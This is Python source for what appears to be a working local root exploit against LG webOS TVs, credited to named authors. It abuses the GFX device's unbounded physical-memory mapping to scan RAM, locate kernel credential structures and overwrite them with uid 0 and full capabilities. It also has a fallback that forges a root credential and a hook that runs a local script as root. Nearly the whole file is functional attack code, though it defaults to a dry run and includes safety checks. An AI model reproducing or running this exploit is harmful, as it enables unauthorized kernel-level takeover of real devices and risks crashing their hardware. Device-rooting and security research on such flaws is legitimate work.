# -*- coding: utf-8 -*-
# ============================================================================
#  GFX-only privilege escalation for LG webOS TVs.
#  AUTHOR: James McVay. This exploit (gfx_cred_escalate.py) is HIS work.
#  Published here with full credit; the permanent-root chain around it
#  (shim + init chain + daemon + NZ Store) is by Natxo (2026-10).
#
#  DYNAMIC MMIO SKIP: auto-detects non-RAM regions so the scan is safe on
#  any SoC (CX, NANO95/E60, and others). Uses /proc/iomem when addresses
#  are available (root), otherwise probes one page per chunk boundary via
#  GFX to discover unreadable regions before the full scan.
# ============================================================================
# GFX-only privilege escalation, self-calibrating and confined to physical
# addresses at or above the GFX BASE floor. No kernel image, no per-model
# constants: version-specific state is derived on the target from the GFX
# primitive plus world-readable procfs. The path is checked against local
# C9..C6 kernel images; only the CX has a live root result.
#
# The floor: GFX computes phys = BASE + (pgoff << 12) with pgoff unsigned, so
# nothing below BASE is addressable. init_task, init_cred and the kernel image
# all sit below it. This probe never maps below BASE and never relies on a fixed
# low anchor.
#
# What is derived at runtime, and how:
#   BASE, carveout end   <- /proc/lg/gfx/mem_stat (published, world-readable)
#   RAM top              <- /proc/zoneinfo upper bound; a zone may contain
#                           holes, so a scan can still fault or stall hardware
#   our uid/gid          <- getuid()/getgid(), not hardcoded
#   PAGE_OFFSET          <- one matched (virtual, physical) cred pair. A cred is
#                           found physically by its (uid,gid)*4 content
#                           signature; the SAME cred's pointer value is read out
#                           of a task_struct we find by its unique comm; the
#                           difference is the linear-map offset. Deriving it from
#                           a real pair absorbs KASLR and a randomised memstart
#                           for free -- we never assume a constant. Confirmed by
#                           agreement across at least two children.
#   uid field offset     <- vote among the 4- and 8-byte usage layouts; the
#                           DEBUG_CREDENTIALS candidate is refused for writes
#   comm->cred gap        <- the two equal pointer-like words immediately before
#                           comm are real_cred==cred; their position gives the
#                           gap, cross-checked by the PAGE_OFFSET match.
#   cap field offset     <- matched against CapInh/Prm/Eff/Bnd from the running
#                           process in at least two confirmed child creds
#
# Strategies, safest first:
#   PRIMARY (in-place):  fork a batch of quiescent children, each with a unique
#       comm; a child whose task_struct AND cred both land >= BASE self-patches
#       its own cred (hard identity gate, usage untouched, thrash+retry for the
#       uncached/cached coherency race, benign failure). Recommended.
#   FALLBACK (redirect): if no child has a reachable cred, forge a root cred in
#       one of our own reachable userspace pages and repoint the task's
#       real_cred/cred at it. Opt-in; writes a hot task_struct line and leans on
#       page stability and coherency.
#
# Safety: no map below BASE; PRIMARY writes only after the cred reads back as our
# own uid/gid; usage is never touched. Dry run by default. argv: (none) ->
# calibrate, locate, report, write nothing; "go" -> allow PRIMARY; "go redirect"
# -> also allow FALLBACK.

import ctypes, fcntl, os, re, struct, sys, random, select, signal, time

PROT_READ, PROT_WRITE, MAP_SHARED = 1, 2, 1
SYS_mmap2, PR_SET_NAME = 192, 15

# GFX_Ioctl _IOW('G', 0x0c, 12): copies 12 bytes from the arg and stores
# (first_u32 & 1) into private_data[0]. A non-zero flag makes GFX_SurfaceMmap
# skip the non-cached vm_page_prot rewrite, so the mapping is cacheable and
# coherent with the kernel's own cached view, while the unbounded BASE+(pgoff<<12)
# arithmetic is unchanged. Without it the mapping is non-cached and a write to a
# live, cache-resident cred loses the coherency race. The cmd's single build
# site is present in all eight checked kernel images (C9/CX 4.4,
# C3/C4/C5 5.4, C3/C6 6.12);
# on CX and C6 that site is the verified flag-set dispatch, so it is not
# per-model.
GFX_SET_CACHED = 0x400c470c
USE_CACHED = True
KHALF = 0xffff000000000000               # kernel-half VA floor (sanity for PAGE_OFFSET)
GFX = "/dev/lg/gfx0"
CHUNK = 16 * 1024 * 1024
OVERLAP = 0x1000
SCAN_TOTAL_TIMEOUT = 180
SKIP_RANGES = []

libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.syscall.restype = ctypes.c_void_p
libc.munmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
libc.mlock.argtypes  = [ctypes.c_void_p, ctypes.c_size_t]
libc.prctl.argtypes  = [ctypes.c_int, ctypes.c_char_p, ctypes.c_ulong,
                        ctypes.c_ulong, ctypes.c_ulong]

# ---- target parameters, filled in by calibrate() ----
class P:
    base = carveout_end = ram_top = 0
    page_offset = uid_off = cap_off = cred_gap = 0
    cap_full = 0
    ncap = 4
    tpl_uidfp = 0                            # a reachable uid-field phys, stashed during calibration
    myuid = os.getuid()
    mygid = os.getgid()

def log(s):
    sys.stderr.write(s + "\n"); sys.stderr.flush()

# ---- GFX physical map/read/write, all >= BASE ----

def gfx_map(phys, length, prot):
    # Candidate pointers are untrusted until calibrated. Keep even speculative
    # reads inside the reported RAM span, before opening the device.
    if (length <= 0 or not P.base or not P.ram_top or
            phys < P.base or phys + length > P.ram_top):
        return (None, 0, -1)
    for skip_lo, skip_hi in SKIP_RANGES:
        if phys < skip_hi and phys + length > skip_lo:
            return (None, 0, -1)
    base = phys & ~0xfff
    span = ((phys + length - base + 0xfff) & ~0xfff) or 0x1000
    pgoff = (base - P.base) >> 12
    fd = os.open(GFX, os.O_RDWR)
    try:
        if USE_CACHED:                                   # required for the write path
            fcntl.ioctl(fd, GFX_SET_CACHED, struct.pack('<III', 1, 0, 0))
        a = libc.syscall(SYS_mmap2, 0, span, prot, MAP_SHARED, fd, pgoff)
    except Exception:
        os.close(fd)
        raise
    if a is None or a == 0 or a == 0xffffffff:
        os.close(fd); return (None, 0, -1)
    return (a, span, fd)

def gfx_peek(phys, n):
    """Re-read through a bounded child, including for candidate addresses."""
    return gfx_read(phys, n)

def read_child_output(pid, r, max_bytes, seconds):
    """Bound a physical-read child and reject incomplete observations."""
    data, failure = b"", None
    until = time.time() + seconds
    try:
        while True:
            remaining = until - time.time()
            if remaining <= 0 or not select.select([r], [], [], remaining)[0]:
                raise RuntimeError("physical-memory child timed out; stop")
            chunk = os.read(r, min(65536, max_bytes - len(data) + 1))
            if not chunk:
                break
            data += chunk
            if len(data) > max_bytes:
                raise RuntimeError("physical-memory child output exceeded limit; stop")
    except Exception as e:
        failure = e
    finally:
        os.close(r)
        if failure is not None:
            try: os.kill(pid, signal.SIGKILL)
            except OSError: pass
        stop = time.time() + 0.5
        waited, status = os.waitpid(pid, os.WNOHANG)
        while waited == 0 and time.time() < stop:
            time.sleep(0.01)
            waited, status = os.waitpid(pid, os.WNOHANG)
        if waited == 0:
            try: os.kill(pid, signal.SIGKILL)
            except OSError: pass
            raise RuntimeError("physical-memory child did not exit; stop and cold boot")
    if failure is not None:
        raise failure
    return data, status

def gfx_read(phys, n):
    """Fork-isolated read; None if unreachable or the region faults."""
    if phys < P.base: return None
    r, w = os.pipe(); pid = os.fork()
    if pid == 0:
        os.close(r); libc.prctl(PR_SET_NAME, b"gfxrd", 0, 0, 0)
        a, span, fd = gfx_map(phys, n, PROT_READ)
        if a is None: os._exit(1)
        try: os.write(w, ctypes.string_at(a + (phys & 0xfff), n))
        except Exception: os._exit(2)
        os._exit(0)
    os.close(w)
    buf, status = read_child_output(pid, r, n, 10)
    return buf if len(buf) == n and os.WIFEXITED(status) and os.WEXITSTATUS(status) == 0 else None

def gfx_write(phys, data):
    if phys < P.base: return False
    a, span, fd = gfx_map(phys, len(data), PROT_READ | PROT_WRITE)
    if a is None: return False
    ctypes.memmove(a + (phys & 0xfff), data, len(data))
    libc.munmap(ctypes.c_void_p(a), span); os.close(fd)
    return True

def phys_of(v):  return v - P.page_offset
def reachable(v): return (v >> 48) == 0xffff and v >= KHALF and phys_of(v) >= P.base
def pointerlike(v): return (v >> 48) == 0xffff and v >= KHALF

THRASH = bytearray(8 * 1024 * 1024)
def thrash():
    s = 0
    for i in range(0, len(THRASH), 64): s += THRASH[i]
    return s

# ---- procfs-derived parameters ----

def parse_mem_stat():
    """BASE and carveout end from /proc/lg/gfx/mem_stat (fallback /proc/kdump_mem)."""
    try:
        t = open("/proc/lg/gfx/mem_stat").read()
        base = int(re.search(r"mem base.*?0x([0-9a-fA-F]+)", t).group(1), 16)
        length = int(re.search(r"mem length.*?\((\d+)\)", t).group(1))   # the byte count
        return base, (base + length + 0xfff) & ~0xfff
    except Exception:
        pass
    try:
        m = re.search(r"(\d+)M@0x([0-9a-fA-F]+)", open("/proc/kdump_mem").read())
        base = int(m.group(2), 16); length = int(m.group(1)) << 20
        return base, (base + length + 0xfff) & ~0xfff
    except Exception:
        return None, None

def _probe_chunk(phys):
    """Fork a child that tries to read one page at phys via GFX.
    Returns True if readable, False if SIGBUS/fail."""
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(r)
        libc.prctl(PR_SET_NAME, b"gfxprobe", 0, 0, 0)
        a, span, fd = gfx_map(phys, 0x1000, PROT_READ)
        if a is None:
            os._exit(1)
        try:
            ctypes.string_at(a, 64)
        except Exception:
            os._exit(2)
        libc.munmap(ctypes.c_void_p(a), span)
        os.close(fd)
        os._exit(0)
    os.close(w)
    try:
        _, status = read_child_output(pid, r, 64, 5)
    except RuntimeError:
        try:
            os.kill(pid, signal.SIGKILL)
            os.waitpid(pid, 0)
        except Exception:
            pass
        return False
    if os.WIFEXITED(status) and os.WEXITSTATUS(status) == 0:
        return True
    return False

def _probe_skip_ranges(scan_lo, scan_hi):
    """Build skip ranges by probing one page per CHUNK boundary."""
    log("iomem: probing %d chunk boundaries for MMIO regions..." %
        (((scan_hi - scan_lo) + CHUNK - 1) // CHUNK))
    skips = []
    skip_start = None
    off = scan_lo
    while off < scan_hi:
        ok = _probe_chunk(off)
        if not ok:
            if skip_start is None:
                skip_start = off
        else:
            if skip_start is not None:
                skips.append((skip_start, off))
                skip_start = None
        off += CHUNK
    if skip_start is not None:
        skips.append((skip_start, scan_hi))
    return skips

def detect_mmio_skip_ranges(scan_lo, scan_hi):
    """Build SKIP_RANGES from /proc/iomem, with probe-based fallback.

    Parses /proc/iomem to find all top-level regions in [scan_lo, scan_hi)
    that are NOT "System RAM". On kernels that zero addresses for non-root
    (common on webOS), falls back to probing one page per chunk boundary
    via the GFX device to discover unreadable regions before the full scan.
    """
    try:
        lines = open("/proc/iomem").readlines()
    except Exception:
        log("iomem: cannot read /proc/iomem, falling back to probe")
        return _probe_skip_ranges(scan_lo, scan_hi)

    # Check whether addresses are zeroed (non-root on most kernels)
    addrs_zeroed = True
    ram_regions = []
    for line in lines:
        if line[0] in (' ', '\t'):
            continue
        m = re.match(r'\s*([0-9a-fA-F]+)-([0-9a-fA-F]+)\s*:\s*(.*)', line)
        if not m:
            continue
        lo = int(m.group(1), 16)
        hi = int(m.group(2), 16) + 1
        label = m.group(3).strip()
        if lo != 0 or hi != 1:
            addrs_zeroed = False
        if lo >= scan_hi or hi <= scan_lo:
            continue
        ram_regions.append((lo, hi, label))

    if addrs_zeroed:
        log("iomem: addresses zeroed (non-root), falling back to probe")
        return _probe_skip_ranges(scan_lo, scan_hi)

    if not ram_regions:
        log("iomem: no regions overlap scan range, no MMIO skip")
        return []

    ram_set = []
    for lo, hi, label in ram_regions:
        if "System RAM" in label:
            ram_set.append((max(lo, scan_lo), min(hi, scan_hi)))

    ram_set.sort()
    merged_ram = []
    for lo, hi in ram_set:
        if merged_ram and lo <= merged_ram[-1][1]:
            merged_ram[-1] = (merged_ram[-1][0], max(merged_ram[-1][1], hi))
        else:
            merged_ram.append((lo, hi))

    skips = []
    cursor = scan_lo
    for rlo, rhi in merged_ram:
        if rlo > cursor:
            skips.append((cursor, rlo))
        cursor = max(cursor, rhi)
    if cursor < scan_hi:
        skips.append((cursor, scan_hi))

    if skips:
        total_skip = sum(hi - lo for lo, hi in skips)
        log("iomem: detected %d MMIO skip region(s), %.1f MB total:" %
            (len(skips), total_skip / (1024.0 * 1024.0)))
        for lo, hi in skips:
            log("  skip 0x%x-0x%x (%.1f MB)" % (lo, hi, (hi - lo) / (1024.0 * 1024.0)))
    else:
        log("iomem: scan range is all System RAM, no MMIO skip needed")

    return skips

def read_cap_mask():
    try:
        with open("/proc/sys/kernel/cap_last_cap") as source:
            last = int(source.read().strip())
    except Exception:
        raise RuntimeError("kernel capability limit unavailable; no write")
    if last < 0 or last >= 64:
        raise RuntimeError("unsupported kernel capability limit; no write")
    return (1 << (last + 1)) - 1

def read_caps():
    """Current capability words in the order stored in struct cred."""
    fields = {}
    with open("/proc/self/status") as source:
        for line in source:
            key, sep, value = line.partition(":")
            if sep and key in ("CapInh", "CapPrm", "CapEff", "CapBnd"):
                fields[key] = int(value.strip(), 16)
    names = ("CapInh", "CapPrm", "CapEff", "CapBnd")
    if any(name not in fields for name in names) or not any(fields.values()):
        raise RuntimeError("capability baseline unavailable or indistinguishable; no write")
    return struct.pack('<QQQQ', *(fields[name] for name in names))

def find_ram_top(lo):
    """Use zoneinfo as an upper bound, never an assertion that all pages are safe."""
    try:
        top_pfn, spanned = 0, None
        for line in open("/proc/zoneinfo"):
            s = line.split()
            if len(s) >= 2 and s[0] == "spanned":
                spanned = int(s[1])
            elif len(s) >= 2 and s[0].rstrip(":") == "start_pfn" and spanned is not None:
                top_pfn = max(top_pfn, int(s[1].rstrip(":")) + spanned)
        if top_pfn:
            top = top_pfn << 12
            if top > lo:
                return top
    except Exception:
        pass
    raise RuntimeError("zoneinfo does not provide a usable RAM bound; no active probing")

# ---- content scan over reachable RAM ----

def scan_needle(needle, lo, hi, want_before=0):
    """Return [(phys, before_bytes)] for every occurrence of needle in [lo,hi).
    before_bytes is want_before bytes preceding the hit (for comm->cred)."""
    if not isinstance(needle, bytes):
        needle = needle.encode('ascii')
    if lo < P.base or hi > P.ram_top or lo >= hi:
        raise RuntimeError("scan range outside reported RAM bound")
    out = []
    off = lo
    skipped = 0
    until = time.time() + SCAN_TOTAL_TIMEOUT
    while off < hi:
        if time.time() >= until:
            raise RuntimeError("physical-memory scan exceeded total deadline; stop")
        in_skip = False
        for skip_lo, skip_hi in SKIP_RANGES:
            if off >= skip_lo and off < skip_hi:
                log("scan: skipping dangerous range 0x%x (-> 0x%x)" % (off, skip_hi))
                off = skip_hi
                in_skip = True
                break
        if in_skip:
            continue
        length = min(CHUNK + OVERLAP, hi - off)
        r, w = os.pipe(); pid = os.fork()
        if pid == 0:
            os.close(r); libc.prctl(PR_SET_NAME, b"gfxscan", 0, 0, 0)
            a, span, fd = gfx_map(off, length, PROT_READ)
            if a is None: os._exit(1)
            buf = ctypes.string_at(a, length)            # a hole can fault; parent then stops
            libc.munmap(ctypes.c_void_p(a), span); os.close(fd)
            rec = []
            pos = buf.find(needle)
            while pos != -1:
                if pos >= want_before:
                    pre = buf[pos-want_before:pos] if want_before else b""
                    rec.append(struct.pack('<Q', off + pos) + pre)
                pos = buf.find(needle, pos + 1)
            payload = b"".join(rec)
            while payload:
                payload = payload[os.write(w, payload):]
            os._exit(0)
        os.close(w)
        try:
            data, status = read_child_output(pid, r, 1024 * 1024,
                                             min(30, until - time.time()))
        except RuntimeError as e:
            raise RuntimeError("physical-memory scan at 0x%x: %s" % (off, e))
        if (os.WIFSIGNALED(status) and os.WTERMSIG(status) == signal.SIGBUS) or \
           (os.WIFEXITED(status) and os.WEXITSTATUS(status) in (1, 2)):
            skipped += 1
            if os.WIFSIGNALED(status):
                log("scan: skipping SIGBUS chunk at 0x%x" % off)
            else:
                log("scan: skipping failed chunk at 0x%x (exit %d)" % (off, os.WEXITSTATUS(status)))
            if skipped * CHUNK > (hi - lo) // 2:
                raise RuntimeError("physical-memory scan skipped over half its range; stop")
            off += CHUNK
            continue
        if not os.WIFEXITED(status) or os.WEXITSTATUS(status) != 0:
            raise RuntimeError("physical-memory scan faulted at 0x%x (wait status 0x%x); "
                               "stop without using partial results" % (off, status))
        reclen = 8 + want_before
        if len(data) % reclen:
            raise RuntimeError("physical-memory scan returned an incomplete record; stop")
        for i in range(0, len(data) - reclen + 1, reclen):
            phys = struct.unpack('<Q', data[i:i+8])[0]
            out.append((phys, data[i+8:i+reclen]))
        off += CHUNK
    return out

# ---- calibration ----

def exact_tag(comm_phys, tags):
    raw = gfx_peek(comm_phys, max(len(t) for t in tags) + 1)
    if raw is None:
        return None
    tag = raw.split(b'\0', 1)[0].decode('ascii', 'replace')
    return tag if tag in tags else None

def select_layout(qualified):
    """Select a unique, strong plurality; identical cred signatures create
    cross-paired virtual/physical matches even with distinct child tags."""
    if not qualified:
        return None
    ranked = sorted(qualified, key=lambda item: len(item[3]), reverse=True)
    if len(ranked) == 1:
        return ranked[0]
    lead, runner = len(ranked[0][3]), len(ranked[1][3])
    if lead < 10 or lead < 2 * runner + 2:
        return None
    return ranked[0]

def calibrate(prefix, tags):
    sig = (struct.pack('<I', P.myuid) + struct.pack('<I', P.mygid)) * 4   # 32-byte cred prefix
    uid_hits = [phys for phys, _ in scan_needle(sig, P.carveout_end, P.ram_top)]
    comm_hits = scan_needle(prefix, P.carveout_end, P.ram_top, want_before=56)
    log("calibration scan: %d uid creds, %d comm tags in reachable RAM"
        % (len(uid_hits), len(comm_hits)))
    if not uid_hits or not comm_hits:
        return False
    # The cred preamble (struct start -> uid field) is not fixed: it is 4 on the
    # atomic_t-usage layouts (4.4, early 5.4), 8 on the atomic_long-usage
    # layouts (later 5.4, 6.x), or 20 with DEBUG_CREDENTIALS. Candidate
    # struct starts for each uid field, one per possible preamble:
    starts = set()                                       # (struct_start_phys, preamble, uid_phys)
    for ufp in uid_hits:
        for p in (4, 8, 20):
            if ufp >= p:
                starts.add((ufp - p, p, ufp))

    # PAGE_OFFSET: vote across (comm hit, cred gap, preamble). Only the true
    # preamble yields a page-aligned linear offset, so wrong ones drop out.
    votes = {}                                           # key -> tag -> distinct observations
    for comm_phys, before in comm_hits:
        tag = exact_tag(comm_phys, tags)
        if tag is None:
            continue
        for gap in range(8, 56, 8):                      # cred is `gap` bytes before comm
            o = 56 - gap
            if o < 8: continue
            cred_v = struct.unpack('<Q', before[o:o+8])[0]
            real_v = struct.unpack('<Q', before[o-8:o])[0]
            if cred_v != real_v or not pointerlike(cred_v):   # real_cred == cred, both ptrs
                continue
            for ss, p, ufp in starts:
                po = cred_v - ss
                if po >= KHALF and (po & 0xfff) == 0 and (po >> 48) == 0xffff:
                    k = (po, gap, p)
                    votes.setdefault(k, {}).setdefault(tag, set()).add((comm_phys, cred_v, ss, ufp))
    if not votes:
        return False

    # Require two independently tagged, still-live children to resolve the
    # same layout and full 32-byte identity. If cross-paired credentials yield
    # multiple layouts, select only a strongly dominant one.
    qualified = []
    for (po, gap, p), supporters in votes.items():
        if len(supporters) < 2:
            continue
        confirmed = []
        for tag, observations in supporters.items():
            if len(observations) != 1:                    # ambiguous tag location
                continue
            comm_phys, cred_v, ss, ufp = next(iter(observations))
            if ss < P.base or ss + p + len(sig) > P.ram_top:
                continue
            before = gfx_peek(comm_phys - 56, 56)
            o = 56 - gap
            if (before is None or exact_tag(comm_phys, tags) != tag or
                    struct.unpack('<Q', before[o-8:o])[0] != cred_v or
                    struct.unpack('<Q', before[o:o+8])[0] != cred_v or
                    cred_v - po != ss or gfx_peek(ufp, len(sig)) != sig):
                continue
            confirmed.append((comm_phys, ufp))
        if len(confirmed) >= 2 and len(set(c for c, _ in confirmed)) >= 2:
            qualified.append((po, gap, p, confirmed))
    selected = select_layout(qualified)
    if selected is None:
        log("calibration refused: %d independently confirmed layouts" % len(qualified))
        for po, gap, p, confirmed in sorted(qualified)[:20]:
            log("  candidate PAGE_OFFSET=0x%x gap=%d uid_off=%d votes=%d" %
                (po, gap, p, len(confirmed)))
        return False
    po, gap, p, confirmed = selected
    if p == 20:
        log("DEBUG_CREDENTIALS cap layout is not qualified for this POC")
        return False
    P.page_offset, P.cred_gap, P.uid_off = po, gap, p
    P.tpl_uidfp = confirmed[0][1]                       # matched, re-read credential
    # Capability alignment is independent of the usage width: later 5.4 and
    # 6.12 both have uid+8, but their cap blocks start at uid+36 and uid+40.
    # Compare the four 64-bit words reported by /proc/self/status against all
    # matched child creds; refuse a missing or ambiguous match.
    try:
        cap_words = read_caps()
    except (OSError, ValueError, RuntimeError) as e:
        log("capability calibration refused: %s" % e)
        return False
    matching = []
    for candidate in (36, 40):
        if all(ufp + candidate + len(cap_words) <= P.ram_top and
               gfx_peek(ufp + candidate, len(cap_words)) == cap_words
               for _, ufp in confirmed):
            matching.append(candidate)
    if len(matching) != 1:
        log("capability calibration refused: %d matching offsets" % len(matching))
        return False
    P.cap_off = matching[0]
    log("PAGE_OFFSET=0x%x  comm->cred gap=%d  uid_off=%d  cap_off=%d  (%d votes)"
        % (po, gap, P.uid_off, P.cap_off, len(confirmed)))
    return P.page_offset != 0

# ---- children: unique comm, block quiescent until told what to do ----

def spawn_children(tags):
    kids = []
    for tag in tags:
        wake_r, wake_w = os.pipe(); res_r, res_w = os.pipe()
        pid = os.fork()
        if pid == 0:
            os.close(wake_w); os.close(res_r)
            child_body(wake_r, res_w, tag); os._exit(0)
        os.close(wake_r); os.close(res_w)
        kids.append({"pid": pid, "tag": tag, "wake": wake_w, "res": res_r})
    return kids

def child_body(wake_r, res_w, tag):
    libc.prctl(PR_SET_NAME, tag.encode('ascii'), 0, 0, 0)
    mode = os.read(wake_r, 1)
    if not mode or mode == b"X":
        os._exit(0)
    if mode == b"P":
        hdr = b""
        while len(hdr) < 12:
            c = os.read(wake_r, 12 - len(hdr))
            if not c: os._exit(0)
            hdr += c
        cred_phys, uid_off, cap_off = struct.unpack('<QHH', hdr)
        os.write(res_w, b"WOKEN\n")                                   # <--- beacon: the wake landed
        rc = self_patch(cred_phys, uid_off, cap_off, res_w)
        # --- hook de sesion: si somos root, lanzar payload propio (desacoplado) ---
        if os.getuid() == 0 and os.path.exists("/tmp/rootcmd.sh"):
            os.system("setsid /bin/sh /tmp/rootcmd.sh >/dev/null 2>&1 &")
        os._exit(rc)
    if mode == b"R":
        os._exit(verify_root(res_w))
    os._exit(0)

def prove_and_report(res_w, note, proof_dir="/media/developer"):
    try:
        p = os.path.join(proof_dir, ".rootproof.%d.%016x" % (os.getpid(), random.getrandbits(64)))
        fd = os.open(p, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW, 0o600)
        try:
            os.write(fd, b"root\n")
            owner = os.fstat(fd).st_uid
        finally:
            os.close(fd)
            os.unlink(p)
        os.write(res_w, b"ROOT %s uid=0 proof_owner=%d\n" % (note, owner))
    except Exception as e:
        os.write(res_w, b"ROOT %s uid=0 (proof step: %s)\n" % (note, str(e).encode()))

def self_patch(cred_phys, uid_off, cap_off, res_w):
    os.write(res_w, b"PREPEEK\n")                                     # <--- beacon
    ids = gfx_peek(cred_phys + uid_off, 32)
    os.write(res_w, b"POSTPEEK ids=%d\n" % (len(ids) if ids else 0))  # <--- beacon
    if not ids:
        os.write(res_w, b"ABORT cred unreadable\n"); return 4
    want = (struct.pack('<II', P.myuid, P.mygid)) * 4
    if ids != want:
        os.write(res_w, b"ABORT full credential identity changed; refusing\n"); return 5
    try:
        cap_words = read_caps()
    except (OSError, ValueError, RuntimeError):
        os.write(res_w, b"ABORT capability baseline unavailable\n"); return 5
    if (cred_phys + uid_off + cap_off + len(cap_words) > P.ram_top or
            gfx_peek(cred_phys + uid_off + cap_off, len(cap_words)) != cap_words):
        os.write(res_w, b"ABORT capability layout changed; refusing\n"); return 5
    zero = b"\x00" * 32                                   # uid..fsgid
    caps = struct.pack('<QQQQ', P.cap_full, P.cap_full, P.cap_full, P.cap_full)
    for attempt in range(1, 21):
        if not (gfx_write(cred_phys + uid_off, zero) and
                gfx_write(cred_phys + uid_off + cap_off, caps)):
            os.write(res_w, b"ABORT rw map refused\n"); return 6
        thrash()
        if os.getuid() == 0:
            prove_and_report(res_w, b"in-place after %d write(s)" % attempt); return 0
    os.write(res_w, b"RACE uid=%d after 20 writes (benign)\n" % os.getuid()); return 7

def verify_root(res_w):
    # Prove via the cred's own id fields only. A forged cred is not a real
    # kmem_cache cred: its cloned security/sub-object pointers are not refcounted
    # like the kernel's own, so a VFS/LSM path (opening a file) can fault on it.
    # getuid/geteuid/getgid just read cred bytes, so they are safe and sufficient.
    for _ in range(40):
        thrash()
        if os.getuid() == 0:
            os.write(res_w, b"ROOT via redirect uid=%d euid=%d gid=%d egid=%d\n"
                     % (os.getuid(), os.geteuid(), os.getgid(), os.getegid())); return 0
    os.write(res_w, b"RACE uid=%d after redirect (benign)\n" % os.getuid()); return 7

def send(kid, msg):
    fd = kid["wake"]
    if fd < 0:
        raise OSError("child wake pipe already closed")
    try:
        os.write(fd, msg)
    finally:
        os.close(fd)
        kid["wake"] = -1
def read_result(kid):
    out = b""
    until = time.time() + 90
    while True:
        remaining = until - time.time()
        if remaining <= 0 or not select.select([kid["res"]], [], [], remaining)[0]:
            raise RuntimeError("sin reporte en 90s; parcial=%r" % out)
        c = os.read(kid["res"], 4096)
        if not c: break
        out += c
        if len(out) > 4096:
            raise RuntimeError("selected child returned oversized result; stop")
    return out.decode("ascii", "replace")
def stand_down(kids, keep=None):
    for k in kids:
        if k is keep or k["wake"] < 0: continue
        try: send(k, b"X")
        except OSError: pass
def reap(kids):
    for k in kids:
        if k["res"] >= 0:
            try: os.close(k["res"])
            except OSError: pass
            k["res"] = -1
        try:
            stop = time.time() + 0.5
            waited, unused = os.waitpid(k["pid"], os.WNOHANG)
            while waited == 0 and time.time() < stop:
                time.sleep(0.01)
                waited, unused = os.waitpid(k["pid"], os.WNOHANG)
            if waited == 0:
                os.kill(k["pid"], signal.SIGKILL)
                stop = time.time() + 0.5
                while waited == 0 and time.time() < stop:
                    time.sleep(0.01)
                    waited, unused = os.waitpid(k["pid"], os.WNOHANG)
                if waited == 0:
                    log("child %d did not exit; stop and cold boot" % k["pid"])
        except OSError:
            pass

# ---- classify children against the calibrated parameters ----

def classify(prefix, tags):
    """Return reach/unreach dicts: idx -> (cred_phys, comm_phys)."""
    tagmap = {}
    for i, t in enumerate(tags): tagmap[t] = i
    reach, unreach = {}, {}
    for comm_phys, before in scan_needle(prefix, P.carveout_end, P.ram_top, want_before=P.cred_gap+16):
        # recover the full tag to map back to a child index
        tag = exact_tag(comm_phys, tags)
        if tag is None: continue
        m = tagmap[tag]
        o = len(before) - P.cred_gap
        cred_v = struct.unpack('<Q', before[o:o+8])[0]
        real_v = struct.unpack('<Q', before[o-8:o])[0]
        if cred_v != real_v or not pointerlike(cred_v): continue
        cred_phys = phys_of(cred_v)
        (reach if cred_phys >= P.base else unreach).setdefault(m, (cred_phys, comm_phys))
    return reach, unreach

def primary_target_valid(cred_phys, comm_phys, tag):
    """Re-read the selected child's tag, pointer pair and full identity."""
    if exact_tag(comm_phys, [tag]) != tag:
        return False
    pair = gfx_peek(comm_phys - P.cred_gap - 8, 16)
    if pair is None:
        return False
    real_v, cred_v = struct.unpack('<QQ', pair)
    if real_v != cred_v or cred_v != cred_phys + P.page_offset:
        return False
    want = (struct.pack('<II', P.myuid, P.mygid)) * 4
    if gfx_peek(cred_phys + P.uid_off, 32) != want:
        return False
    try:
        cap_words = read_caps()
    except (OSError, ValueError, RuntimeError):
        return False
    return (cred_phys + P.uid_off + P.cap_off + len(cap_words) <= P.ram_top and
            gfx_peek(cred_phys + P.uid_off + P.cap_off, len(cap_words)) == cap_words)

# ---- redirect fallback (opt-in) ----

MAP_PRIVATE_ANON = 0x22                                  # MAP_PRIVATE | MAP_ANONYMOUS (ARM)

def place_forged_cred(template):
    """Forge a root cred in one of our own page-aligned, mlocked anonymous pages
    that lands at or above BASE, verified by reading it back THROUGH GFX at that
    physical address (the coherent view the kernel will use) before it is used.
    All candidate pages carry one unique 16-byte tag and are located in a SINGLE
    scan; the forged cred is then written straight to the chosen physical page
    via GFX. The cred sits at a page boundary (4 KB-aligned), the pages stay
    mlocked against migration for the child's lifetime, and usage is huge so
    put_cred never frees it into cred_jar."""
    forged = bytearray(template)
    if P.uid_off == 8:                                   # 8-byte usage (later 5.4, 6.x)
        struct.pack_into('<Q', forged, 0, 0x40000000)
    else:                                                # atomic_t usage (4.4/5.4), uid at +4
        struct.pack_into('<I', forged, 0, 0x40000000)    # huge -> never freed
    for k in range(8): struct.pack_into('<I', forged, P.uid_off + 4*k, 0)   # uid..fsgid = 0
    for k in range(P.ncap): struct.pack_into('<Q', forged, P.uid_off + P.cap_off + 8*k, P.cap_full)
    # In Python 2, bytes is an alias for str; bytes(bytearray) can produce the
    # bytearray representation instead of its raw contents.
    forged = struct.pack('<%dB' % len(forged), *forged)
    want = struct.pack('<III', 0x40000000, 0, 0)         # usage, uid, gid as placed

    tag = b"GFXFORGE" + struct.pack('<Q', random.getrandbits(64))   # 16 bytes, unique this run
    pages = []
    for _ in range(15):                                  # 15*4KB = 60KB <= RLIMIT_MEMLOCK (64 KB)
        a = libc.syscall(SYS_mmap2, 0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE_ANON, -1, 0)
        if a is None or a == 0 or a == 0xffffffff: continue
        if libc.mlock(ctypes.c_void_p(a), 0x1000) != 0:  # must stay put, or phys is unreliable
            libc.munmap(ctypes.c_void_p(a), 0x1000); continue
        ctypes.memmove(a, tag, len(tag))                 # tag at offset 0 -> a hit is a page base
        pages.append(a)
    if not pages:
        return (None, None)
    for phys, _ in scan_needle(tag, P.carveout_end, P.ram_top):      # ONE scan for all candidates
        if phys >= P.base and (phys & 0xfff) == 0:       # page-aligned hit of our unique tag = our page
            if not gfx_write(phys, forged): continue
            chk = gfx_peek(phys, P.uid_off + 8)          # readback gate, through the kernel's view
            if chk and chk[:4] + chk[P.uid_off:P.uid_off+8] == want:
                return (phys + P.page_offset, phys)      # pages stay mlocked; do not munmap
    return (None, None)

def do_redirect(kids, targets, go):
    idx, (cred_phys, comm_phys) = sorted(targets.items())[0]
    log("FALLBACK target: child idx=%d comm@phys 0x%x (cred@phys 0x%x)" % (idx, comm_phys, cred_phys))
    if not go:
        log("dry run: would forge a root cred and repoint real_cred/cred. no write."); return None
